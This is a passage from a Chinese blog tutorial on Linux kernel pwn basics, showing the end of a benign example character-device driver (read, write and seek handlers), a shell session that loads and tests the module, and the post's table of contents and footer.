<span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_to_user</span>(buf, dev-&gt;mem + *pos, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Read %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title">hello_write</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">const</span> <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *pos)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (*pos &gt;= MAX_SIZE) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = (<span class="type">unsigned</span> <span class="type">int</span>) size;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">hello_dev</span> *dev = filp-&gt;private_data;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MAX_SIZE - *pos) count = MAX_SIZE - *pos;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">copy_from_user</span>(dev-&gt;mem + *pos, buf, count))</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    *pos += count;</span><br><span class="line">    <span class="built_in">printk</span>(<span class="string">&quot;[+] Written %u bytes(s) from %llu\n&quot;</span>, count, *pos);</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">loff_t</span> <span class="title">hello_llseek</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">loff_t</span> offset, <span class="type">int</span> op)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (op != <span class="number">0</span> &amp;&amp; op != <span class="number">1</span>) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (op == <span class="number">1</span>) offset += filp-&gt;f_pos;</span><br><span class="line">    <span class="keyword">if</span> (offset &lt; <span class="number">0</span> || offset &gt; MAX_SIZE) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    <span class="keyword">return</span> filp-&gt;f_pos = offset;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="验证">验证</h3>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">/ # insmod myko.ko </span><br><span class="line">[   17.837662] myko: loading out-of-tree module taints kernel.</span><br><span class="line">[   17.840020] myko: module verification failed: signature and/or required key l</span><br><span class="line">/ # [   17.887877] random: fast init done</span><br><span class="line">/ # lsmod</span><br><span class="line">myko 16384 0 - Live 0xffffffffc002e000 (OE)</span><br><span class="line">/ # mknod /dev/myko c 230 0 #创建设备节点，c表明是字符设备，230是主设备号，0是次设备号</span><br><span class="line">/ # chmod 777 /dev/myko </span><br><span class="line">/ # echo &quot;hello,world!&quot; &gt; /dev/myko </span><br><span class="line">[  103.447740] [+] Written 13 bytes(s) from 13</span><br><span class="line">/ # cat dev/myko </span><br><span class="line">[  111.699740] [+] Read 4096 bytes(s) from 4096</span><br><span class="line">hello,world!</span><br></pre></td></tr></table></figure></div>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> linux kernel pwn 基础知识</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-08 20:23:30</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-20 03:32:21
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/08/linux-kernel-pwn-basic-knowlege/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/linux-kernel-pwn/">#linux kernel pwn</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/08/linux-kernel-pwn-exploit-technique/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">linux kernel pwn 内核利用</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/08/musl-pwn/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">musl pwn</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">linux kernel pwn 基础知识</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#linux-%E5%86%85%E6%A0%B8%E6%A6%82%E8%BF%B0"><span class="nav-text">linux 内核概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A6%82%E8%BF%B0"><span class="nav-text">内核概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%9A%84%E8%81%8C%E8%B4%A3"><span class="nav-text">内核的职责</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-text">内核的分类</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux-%E5%86%85%E6%A0%B8%E7%9A%84%E7%89%B9%E7%82%B9"><span class="nav-text">Linux 内核的特点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#linux-%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="nav-text">Linux 内核版本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99"><span class="nav-text">版本命名规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-text">版本的类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%93%E5%89%8D%E6%B4%BB%E8%B7%83%E7%9A%84%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="nav-text">当前活跃的内核版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="nav-text">查看系统版本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#uname-%E5%91%BD%E4%BB%A4"><span class="nav-text">uname 命令</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%A5%E7%9C%8B-procversion-%E6%96%87%E4%BB%B6"><span class="nav-text">查看 &#x2F;proc&#x2F;version 文件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%80%81%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="nav-text">内核态函数调用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#printf-printk"><span class="nav-text">printf → printk()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#memcpy-copy_from_user-copy_to_user"><span class="nav-text">memcpy →
copy_from_user() &#x2F; copy_to_user()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-kmalloc"><span class="nav-text">malloc() →
kmalloc()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-kfree"><span class="nav-text">free() → kfree()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ring-model"><span class="nav-text">Ring Model</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">基本概念</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F"><span class="nav-text">实现方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AE%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">段保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AE%B5%E9%80%89%E6%8B%A9%E5%AD%90segment-selector"><span class="nav-text">段选择子（Segment Selector）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AE%B5%E6%8F%8F%E8%BF%B0%E7%AC%A6descriptor"><span class="nav-text">段描述符（Descriptor）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%B1%BB%E5%9E%8B"><span class="nav-text">权限类型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5%E8%BF%87%E7%A8%8B"><span class="nav-text">权限检查过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%B5%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">页保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E5%AD%97%E6%AE%B5"><span class="nav-text">权限字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#linux-%E7%9A%84-kpti-%E6%9C%BA%E5%88%B6"><span class="nav-text">Linux 的 KPTI 机制</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%AD%E6%96%AD%E6%9C%BA%E5%88%B6"><span class="nav-text">中断机制</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%AD%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8"><span class="nav-text">中断描述符表</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B"><span class="nav-text">中断处理流程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7%E6%80%81-%E5%86%85%E6%A0%B8%E6%80%81"><span class="nav-text">用户态-&gt;内核态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%80%81-%E7%94%A8%E6%88%B7%E6%80%81"><span class="nav-text">内核态-&gt;用户态</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-syscall"><span class="nav-text">关于 syscall</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E7%AE%A1%E7%90%86"><span class="nav-text">进程权限管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%9D%83%E9%99%90%E5%87%AD%E8%AF%81-cred-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">进程权限凭证： cred
结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%94%A8%E6%88%B7-id-%E5%92%8C%E7%BB%84-id"><span class="nav-text">用户 ID 和组 ID</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#io"><span class="nav-text">IO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%87%E7%89%A9%E7%9A%86%E6%96%87%E4%BB%B6"><span class="nav-text">万物皆文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E7%A8%8B%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">进程文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6"><span class="nav-text">文件描述符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8ioctl"><span class="nav-text">系统调用：ioctl</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="nav-text">内存管理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98"><span class="nav-text">物理内存</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#buddy-system"><span class="nav-text">buddy system</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#slub"><span class="nav-text">slub</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B3%E4%BA%8E-object"><span class="nav-text">关于 object</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kmem_cache-%E5%88%9B%E5%BB%BA"><span class="nav-text">kmem_cache 创建</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slub-%E5%88%86%E9%85%8D"><span class="nav-text">slub 分配</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slub-%E9%87%8A%E6%94%BE"><span class="nav-text">slub 释放</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8E%E7%BB%91%E6%A0%B8"><span class="nav-text">内核堆利用与绑核</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%80%9A%E7%94%A8-kmalloc-flag"><span class="nav-text">通用 kmalloc flag</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slab-alias"><span class="nav-text">slab alias</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-text">内核保护机制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E9%97%B4%E9%9A%94%E7%A6%BB%E7%9B%B8%E5%85%B3"><span class="nav-text">空间隔离相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#smep"><span class="nav-text">SMEP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#smap"><span class="nav-text">SMAP</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kpti"><span class="nav-text">KPTI</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%B0%E5%9D%80%E7%9B%B8%E5%85%B3"><span class="nav-text">地址相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#kaslr"><span class="nav-text">KASLR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fg_kaslr"><span class="nav-text">FG_KASLR</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mmap_min_addr"><span class="nav-text">MMAP_MIN_ADDR</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E7%9B%B8%E5%85%B3"><span class="nav-text">信息相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dmesg-restrictions"><span class="nav-text">Dmesg Restrictions</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#kernel-address-display-restriction"><span class="nav-text">Kernel Address Display
Restriction</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%9B%B8%E5%85%B3"><span class="nav-text">数据相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#hardened_usercopy"><span class="nav-text">HARDENED_USERCOPY</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#static_usermodehelper"><span class="nav-text">STATIC_USERMODEHELPER</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E7%9B%B8%E5%85%B3"><span class="nav-text">栈相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#stack-protector"><span class="nav-text">STACK PROTECTOR</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E7%9B%B8%E5%85%B3"><span class="nav-text">堆相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#slab_freelist_hardened"><span class="nav-text">SLAB_FREELIST_HARDENED</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#slab_freelist_random"><span class="nav-text">SLAB_FREELIST_RANDOM</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init_on_alloc_default_on"><span class="nav-text">INIT_ON_ALLOC_DEFAULT_ON</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5"><span class="nav-text">基础概念</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">启动脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E9%95%9C%E5%83%8F"><span class="nav-text">内核镜像</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">文件系统</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%93%E5%8C%85%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">打包文件系统</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%BF%9C%E7%A8%8B%E4%BC%A0%E8%BE%93%E6%96%B9%E5%BC%8F"><span class="nav-text">文件远程传输方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-vmlinux"><span class="nav-text">获取 vmlinux</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8"><span class="nav-text">编译内核</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vmlinux-to-elf"><span class="nav-text">vmlinux-to-elf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F"><span class="nav-text">下载镜像</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bzimage-%E8%A7%A3%E5%8E%8B"><span class="nav-text">bzImage 解压</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdb-%E8%B0%83%E8%AF%95"><span class="nav-text">gdb 调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E8%AF%91-busybox"><span class="nav-text">编译 busybox</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux-%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97"><span class="nav-text">Linux 内核模块</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-lkms"><span class="nav-text">什么是 LKMs</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4"><span class="nav-text">相关指令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F-1"><span class="nav-text">文件系统</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">file 结构体</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inode%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">inode结构体</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91"><span class="nav-text">内核模块开发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hello-world%E6%A8%A1%E5%9D%97"><span class="nav-text">Hello World模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84%E6%A8%A1%E5%9D%97"><span class="nav-text">带参数的模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8"><span class="nav-text">字符设备驱动</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%BB%93%E6%9E%84"><span class="nav-text">字符设备驱动结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#cdev-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">cdev 结构体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#file_operations-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">file_operations 结构体</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E7%BB%84%E6%88%90"><span class="nav-text">字符设备驱动组成</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%B4%E6%96%87%E4%BB%B6%E5%AE%8F%E5%8F%8A%E8%AE%BE%E5%A4%87%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">头文件、宏及设备结构体</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A0%E8%BD%BD%E4%B8%8E%E5%8D%B8%E8%BD%BD%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8"><span class="nav-text">加载与卸载设备驱动</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE"><span class="nav-text">使用文件私有数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E5%87%BD%E6%95%B0"><span class="nav-text">读写函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#seek%E5%87%BD%E6%95%B0"><span class="nav-text">seek函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ioctl%E5%87%BD%E6%95%B0"><span class="nav-text">ioctl函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="nav-text">完整代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81"><span class="nav-text">验证</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        25 posts in total
                    </span>
                    
                        <span>
                            379.8k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.0</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
